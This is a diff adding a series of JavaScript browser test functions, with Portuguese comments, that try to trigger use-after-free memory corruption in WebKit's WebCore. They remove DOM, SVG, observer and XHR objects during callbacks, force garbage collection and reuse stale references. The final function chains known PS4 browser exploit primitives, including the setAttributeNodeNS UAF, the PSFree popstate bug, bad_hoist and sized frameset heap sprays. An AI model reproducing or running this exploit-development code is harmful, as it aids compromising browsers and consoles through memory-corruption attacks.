+    const area = document.getElementById('dom11');
+    area.style.display = 'block';
+
+    const table = document.createElement('table');
+    const tbody = document.createElement('tbody');
+    table.appendChild(tbody);
+    area.appendChild(table);
+
+    // Inserir 50 linhas
+    const rows = [];
+    for(let i = 0; i < 50; i++){
+      const row = tbody.insertRow(i);
+      row.insertCell(0).textContent = 'cell_' + i;
+      rows.push(row);
+    }
+
+    // Event handler que deleta rows durante eventos nelas
+    let rowN = 0;
+    function rowClickHandler(evt){
+      rowN++;
+      const targetRow = evt.target.closest('tr');
+      try {
+        // Deletar rows adjacentes durante o evento
+        if(rowN < 40 && rows[rowN] && rows[rowN].parentNode){
+          tbody.deleteRow(rows[rowN].rowIndex);
+          gc(); // GC: row deletada pode ser liberada; handler ainda referencia rows[]
+        }
+      } catch(e){}
+    }
+
+    for(let row of rows) row.addEventListener('click', rowClickHandler);
+
+    // Disparar clicks em todas as rows
+    for(let row of rows){
+      try { row.dispatchEvent(new MouseEvent('click', { bubbles: true })); } catch(e){}
+      gc();
+    }
+
+    // Tentar acessar rows deletadas
+    for(let row of rows){
+      try { row.rowIndex; }   catch(e){}
+      try { row.cells.length; } catch(e){}
+      try { row.textContent; }  catch(e){}
+    }
+
+    area.removeChild(table);
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 266: fim');
+}
+
+// T267 — HTMLFormElement.reset() + GC durante evento reset (WebCore UAF)
+// reset() dispara o evento 'reset'; dentro do handler, remover campos do form
+// pode causar UAF nos FormAssociatedElement internos.
+function t267(){
+  log('Teste 267: inicio');
+  try {
+    const area = document.getElementById('dom11');
+    area.style.display = 'block';
+
+    const form = document.createElement('form');
+    const inputs = [];
+    for(let i = 0; i < 20; i++){
+      const inp = document.createElement('input');
+      inp.type = ['text','email','number','password','search'][i % 5];
+      inp.name = 'field_' + i;
+      inp.value = 'value_' + i;
+      form.appendChild(inp);
+      inputs.push(inp);
+    }
+    // Adicionar select e textarea
+    const sel = document.createElement('select');
+    ['opt1','opt2','opt3'].forEach(function(v){ const o = document.createElement('option'); o.value = v; o.textContent = v; sel.appendChild(o); });
+    form.appendChild(sel);
+    const ta = document.createElement('textarea');
+    ta.value = 'textarea_content';
+    form.appendChild(ta);
+    area.appendChild(form);
+
+    let resetN = 0;
+    form.addEventListener('reset', function(){
+      resetN++;
+      // Remover inputs durante o reset — FormAssociatedElement pode ser UAF
+      try {
+        if(inputs[resetN % inputs.length] && inputs[resetN % inputs.length].parentNode){
+          form.removeChild(inputs[resetN % inputs.length]);
+          gc();
+        }
+      } catch(e){}
+    });
+
+    for(let i = 0; i < 15; i++){
+      try { form.reset(); gc(); } catch(e){}
+    }
+
+    try { area.removeChild(form); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 267: fim');
+}
+
+// T268 — Range API: compareBoundaryPoints + DOM mutation + GC
+// Range armazena ponteiros para nos do DOM; mutar o DOM enquanto o Range
+// e valido pode deixar os endpoints do Range apontando para nos liberados.
+function t268(){
+  log('Teste 268: inicio');
+  try {
+    const area = document.getElementById('dom11');
+    area.style.display = 'block';
+
+    // Construir arvore DOM para o Range
+    const container = document.createElement('div');
+    const texts = [];
+    for(let i = 0; i < 20; i++){
+      const p = document.createElement('p');
+      p.textContent = 'paragraph_content_' + i + '_with_text';
+      container.appendChild(p);
+      texts.push(p);
+    }
+    area.appendChild(container);
+
+    // Criar Ranges que apontam para nos internos
+    const ranges = [];
+    for(let i = 0; i < 10; i++){
+      try {
+        const r = document.createRange();
+        r.setStart(texts[i * 2], 0);
+        r.setEnd(texts[i * 2 + 1], texts[i * 2 + 1].textContent.length);
+        ranges.push(r);
+      } catch(e){}
+    }
+
+    // Remover os nos alvo dos Ranges
+    while(container.firstChild) try { container.removeChild(container.firstChild); } catch(e){}
+    gc(); // GC: nos do DOM coletados; Ranges tem stale endpoint pointers
+
+    // Tentar usar os Ranges apos remocao dos nos
+    for(let r of ranges){
+      try { r.toString(); }                 catch(e){}
+      try { r.cloneContents(); }            catch(e){}
+      try { r.extractContents(); }          catch(e){}
+      try { r.getBoundingClientRect(); }    catch(e){}
+      try { r.collapsed; }                  catch(e){}
+      try { r.startContainer.textContent; } catch(e){}
+      try { r.endContainer.textContent; }   catch(e){}
+    }
+
+    try { area.removeChild(container); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 268: fim');
+}
+
+// T269 — Selection API + Range + DOM removal + GC
+// window.getSelection() retorna uma Selection que referencia Ranges;
+// remover os nos selecionados + GC pode causar UAF na Selection.
+function t269(){
+  log('Teste 269: inicio');
+  try {
+    const area = document.getElementById('dom11');
+    area.style.display = 'block';
+    area.contentEditable = 'true';
+
+    // Criar conteudo selecionavel
+    for(let i = 0; i < 10; i++){
+      const span = document.createElement('span');
+      span.textContent = 'selectable_text_' + i + ' ';
+      area.appendChild(span);
+    }
+
+    // Forcar layout
+    let _ = area.offsetHeight;
+
+    // Selecionar texto via Range
+    try {
+      const sel = window.getSelection();
+      const range = document.createRange();
+      range.selectNodeContents(area);
+      sel.removeAllRanges();
+      sel.addRange(range);
+      gc();
+
+      // Remover nodes enquanto selecionados
+      while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+      gc();
+
+      // Tentar acessar Selection apos remocao dos nos
+      try { sel.toString(); }                catch(e){}
+      try { sel.getRangeAt(0); }             catch(e){}
+      try { sel.anchorNode; }                catch(e){}
+      try { sel.focusNode; }                 catch(e){}
+      try { sel.anchorNode.textContent; }    catch(e){}
+    } catch(e){}
+
+    area.contentEditable = 'false';
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 269: fim');
+}
+
+// T270 — SVG: animateTransform + elemento removido + GC (SVGAnimatedType UAF)
+// SVG tem seu proprio sistema de animacao (SMIL); elementos SVG com animacoes
+// tem SVGAnimatedType alocados em fastMalloc; remover o elemento durante a
+// animacao pode causar UAF quando o SMIL animation engine acessa o elemento.
+function t270(){
+  log('Teste 270: inicio');
+  try {
+    const area = document.getElementById('dom11');
+    area.style.display = 'block';
+
+    const svgNS = 'http://www.w3.org/2000/svg';
+    const svg = document.createElementNS(svgNS, 'svg');
+    svg.setAttribute('width', '200');
+    svg.setAttribute('height', '200');
+    area.appendChild(svg);
+
+    // Criar elementos SVG com animacoes SMIL
+    const svgEls = [];
+    for(let i = 0; i < 10; i++){
+      const rect = document.createElementNS(svgNS, 'rect');
+      rect.setAttribute('x', i * 10);
+      rect.setAttribute('y', i * 10);
+      rect.setAttribute('width', '50');
+      rect.setAttribute('height', '50');
+      rect.setAttribute('fill', 'blue');
+
+      // Animacao de transformacao
+      const anim = document.createElementNS(svgNS, 'animateTransform');
+      anim.setAttribute('attributeName', 'transform');
+      anim.setAttribute('type', 'rotate');
+      anim.setAttribute('from', '0 25 25');
+      anim.setAttribute('to', '360 25 25');
+      anim.setAttribute('dur', '0.1s');
+      anim.setAttribute('repeatCount', '10');
+      rect.appendChild(anim);
+
+      svg.appendChild(rect);
+      svgEls.push({ rect, anim });
+    }
+
+    // Forcar layout para iniciar animacoes SMIL
+    let _ = svg.getBoundingClientRect();
+
+    // Remover elementos durante as animacoes + GC
+    for(let { rect, anim } of svgEls){
+      try {
+        // Remover o animateTransform primeiro (enquanto a animacao esta ativa)
+        rect.removeChild(anim);
+        gc(); // GC: SVGAnimatedType ainda pode ser referenciado pelo engine
+        // Remover o proprio rect
+        svg.removeChild(rect);
+        gc();
+        // Tentar acessar os elementos removidos
+        anim.setAttribute('from', '45 25 25');
+        rect.getBoundingClientRect();
+      } catch(e){}
+    }
+
+    try { area.removeChild(svg); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 270: fim');
+}
+
+// T271 — Node.cloneNode(true) + GC durante clonagem (WebCore CloneNodeOperation)
+// cloneNode recursivo clona toda a arvore; GC durante a clonagem pode liberar
+// nos intermediarios que ainda estao sendo usados na operacao de clone.
+function t271(){
+  log('Teste 271: inicio');
+  try {
+    const area = document.getElementById('dom11');
+    area.style.display = 'block';
+
+    // Arvore DOM complexa para clonar
+    function buildTree271(parent, depth){
+      if(depth <= 0) return;
+      for(let i = 0; i < 4; i++){
+        const el = document.createElement('div');
+        el.setAttribute('data-d', depth);
+        el.setAttribute('data-i', i);
+        el.className = 'clone-node-' + depth;
+        const text = document.createTextNode('text_' + depth + '_' + i);
+        el.appendChild(text);
+        parent.appendChild(el);
+        buildTree271(el, depth - 1);
+      }
+    }
+
+    const root = document.createElement('div');
+    buildTree271(root, 4); // 4^4 = 256 nos
+    area.appendChild(root);
+
+    // Clonar a arvore + GC durante/apos clone
+    for(let i = 0; i < 10; i++){
+      try {
+        let clone = root.cloneNode(true); // deep clone
+        gc();
+        // Remover nos do original durante o uso do clone
+        while(root.firstChild) try { root.removeChild(root.firstChild); } catch(e){}
+        gc();
+        // Acessar o clone cujo original foi liberado
+        let nodes = clone.querySelectorAll('[data-d]');
+        for(let n of nodes){
+          try { n.textContent; }         catch(e){}
+          try { n.getAttribute('data-d'); } catch(e){}
+        }
+        // Reconstruir o original para proxima iteracao
+        buildTree271(root, 4);
+      } catch(e){}
+    }
+
+    try { area.removeChild(root); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 271: fim');
+}
+
+// T272 — IntersectionObserver + DOM removal + GC (WebCore observer UAF)
+// IntersectionObserver monitora visibilidade de elementos; callback e chamado
+// quando elementos entram/saem do viewport; remover o elemento durante o callback
+// pode causar UAF no IntersectionObserver interno.
+function t272(){
+  log('Teste 272: inicio');
+  try {
+    const area = document.getElementById('dom11');
+    area.style.display = 'block';
+
+    const observed = [];
+    for(let i = 0; i < 20; i++){
+      const el = document.createElement('div');
+      el.style.height = '50px';
+      el.textContent = 'observed_' + i;
+      area.appendChild(el);
+      observed.push(el);
+    }
+
+    let callbackN = 0;
+    const io = new IntersectionObserver(function(entries){
+      callbackN++;
+      for(let entry of entries){
+        try {
+          // Remover o elemento observado durante o callback
+          const el = entry.target;
+          if(el.parentNode){
+            area.removeChild(el);
+            gc(); // GC: IntersectionObserverEntry tem stale ptr para elemento
+          }
+          // Tentar acessar o elemento pos-remocao
+          entry.boundingClientRect;
+          entry.intersectionRatio;
+          entry.target.textContent;
+        } catch(e){}
+      }
+    }, { threshold: [0, 0.5, 1.0] });
+
+    for(let el of observed) io.observe(el);
+
+    // Scroll para triggerar callbacks
+    let _ = area.offsetHeight;
+    area.scrollIntoView();
+
+    // Desconectar apos um momento
+    setTimeout(function(){
+      try { io.disconnect(); } catch(e){}
+      while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+      area.style.display = 'none';
+    }, 1000);
+  } catch(e){}
+  log('Teste 272: fim');
+}
+
+// T273 — ResizeObserver + DOM removal + GC (WebCore ResizeObserver UAF)
+// Similar ao IntersectionObserver mas para mudancas de tamanho.
+// ResizeObserver e chamado quando o layout muda; remover o elemento durante
+// o callback pode causar UAF no ResizeObserverEntry.
+function t273(){
+  log('Teste 273: inicio');
+  try {
+    const area = document.getElementById('dom11');
+    area.style.display = 'block';
+
+    const resizeTargets = [];
+    for(let i = 0; i < 10; i++){
+      const el = document.createElement('div');
+      el.style.width = (50 + i * 10) + 'px';
+      el.style.height = '50px';
+      el.textContent = 'resize_target_' + i;
+      area.appendChild(el);
+      resizeTargets.push(el);
+    }
+
+    let roCallbackN = 0;
+    const ro = new ResizeObserver(function(entries){
+      roCallbackN++;
+      for(let entry of entries){
+        try {
+          const el = entry.target;
+          if(el.parentNode && roCallbackN > 3){
+            area.removeChild(el);
+            gc(); // GC durante o callback do ResizeObserver
+          }
+          // Acessar entry pos-remocao
+          entry.contentRect.width;
+          entry.contentRect.height;
+          entry.target.offsetWidth;
+        } catch(e){}
+      }
+    });
+
+    for(let el of resizeTargets) ro.observe(el);
+
+    // Triggerar resize mudando estilos
+    for(let el of resizeTargets){
+      try {
+        el.style.width = (parseInt(el.style.width) + 20) + 'px';
+        gc();
+      } catch(e){}
+    }
+
+    setTimeout(function(){
+      try { ro.disconnect(); } catch(e){}
+      while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+      area.style.display = 'none';
+    }, 1000);
+  } catch(e){}
+  log('Teste 273: fim');
+}
+
+// T274 — XMLHttpRequest + abort() durante eventos + GC (WebCore XHR UAF)
+// XHR mantem um ponteiro para o Document; abortar o XHR durante o evento
+// onreadystatechange ou onload pode causar UAF no XHRLoader interno.
+function t274(){
+  log('Teste 274: inicio');
+  try {
+    // Criar multiplos XHRs e abortar durante eventos
+    for(let i = 0; i < 20; i++){
+      try {
+        const xhr = new XMLHttpRequest();
+        let abortCalled = false;
+
+        xhr.onreadystatechange = function(){
+          if(!abortCalled && xhr.readyState >= 2){
+            abortCalled = true;
+            gc();
+            xhr.abort(); // abortar durante onreadystatechange
+            gc(); // GC: XHRLoader pode ter dangling Document ptr
+          }
+        };
+
+        xhr.onloadstart = function(){ gc(); };
+        xhr.onprogress = function(){ gc(); xhr.abort(); };
+        xhr.onabort = function(){
+          gc();
+          // Tentar usar o XHR apos abort
+          try { xhr.responseText; } catch(e){}
+          try { xhr.status; }       catch(e){}
+          try { xhr.readyState; }   catch(e){}
+        };
+        xhr.onerror = function(){ gc(); };
+
+        // Fazer requisicao para URL invalida (triggera erro rapido)
+        xhr.open('GET', 'about:blank#xhr_test_' + i, true);
+        xhr.send();
+        gc();
+      } catch(e){}
+    }
+
+    // XHR com responseType = 'arraybuffer' + abort
+    try {
+      const xhr2 = new XMLHttpRequest();
+      xhr2.responseType = 'arraybuffer';
+      xhr2.onload = function(){
+        gc();
+        let buf = xhr2.response; // ArrayBuffer pode ser liberado
+        if(buf) buf.byteLength;
+        xhr2.abort();
+        gc();
+        try { let buf2 = xhr2.response; } catch(e){}
+      };
+      xhr2.open('GET', 'about:blank', true);
+      xhr2.send();
+    } catch(e){}
+  } catch(e){}
+  log('Teste 274: fim');
+}
+
+// T275 — STRESS FINAL: setAttributeNodeNS + PSFree popstate + bad_hoist + frameset
+// Combinacao dos quatro vetores mais especificos para PS4 no-JIT nesta rodada
+function t275(){
+  log('Teste 275: inicio');
+  try {
+    // === FASE 1: setAttributeNodeNS UAF (SpecterDev exact) ===
+    try {
+      window._t275cb = function(){
+        window._t275cb = null;
+        try {
+          d275.setAttributeNodeNS(src275);
+          f275.setAttributeNodeNS(document.createAttribute('data-t275'));
+        } catch(e){}
+      };
+      let src275 = document.createAttribute('data-t275');
+      src275.value = 'javascript:parent._t275cb && parent._t275cb()';
+      let d275 = document.createElement('div');
+      let f275 = document.body.appendChild(document.createElement('iframe'));
+      f275.setAttributeNodeNS(src275);
+      f275.remove();
+      f275 = null; src275 = null;
+      gcHeavy();
+      try { d275.attributes[0] && d275.attributes[0].ownerElement; } catch(e){}
+    } catch(e){}
+
+    // === FASE 2: PSFree popstate UAF ===
+    try {
+      let handled275 = false;
+      function ph275(evt){
+        if(handled275) return;
+        handled275 = true;
+        removeEventListener('popstate', ph275);
+        try {
+          let s = evt.state;
+          // Spray frameset imediato
+          const fsets275 = [];
+          for(let i = 0; i < 100; i++){
+            const fset = document.createElement('frameset');
+            fset.rows = ','.repeat(9);
+            fsets275.push(fset);
+          }
+          if(s) try { s.toString(); } catch(e){}
+        } catch(e){}
+      }
+      addEventListener('popstate', ph275);
+      try {
+        history.pushState({ t275: true, d: new Array(10).fill(0xFF) }, '', location.pathname + '#t275a');
+        history.pushState({ t275_2: true }, '', location.pathname + '#t275b');
+      } catch(e){}
+      const inp275 = document.getElementById('inp11');
+      if(inp275){
+        inp275.focus();
+        inp275.onblur = function(){ try { history.replaceState(null, '', location.pathname); } catch(e){}; };
+        setTimeout(function(){ try { history.back(); } catch(e){}; }, 200);
+      }
+    } catch(e){}
+
+    // === FASE 3: bad_hoist (ForInContext) ===
+    try {
+      var obj275 = {};
+      for(let i = 0; i < 30; i++) obj275['k' + i] = i;
+      for(var k275 in obj275){
+        function hoist275(){ gc(); return k275; } // eslint-disable-line no-inner-declarations
+        hoist275();
+        obj275.__proto__ = {};
+      }
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 4: frameset spray massivo ===
+    try {
+      const fsets = [];
+      for(let ssv_len of [0x58, 0x60, 0x68, 0x70]){
+        for(let i = 0; i < 50; i++){
+          const fset = document.createElement('frameset');
+          fset.rows = ','.repeat(Math.max(1, ssv_len / 8 - 2));
+          fsets.push(fset);
+        }
+      }
+      gc();
+      fsets.length = 0;
+      gcHeavy();
+    } catch(e){}
+  } catch(e){}
+  log('Teste 275: fim');
+}
+</script>
+</body>
+</html>
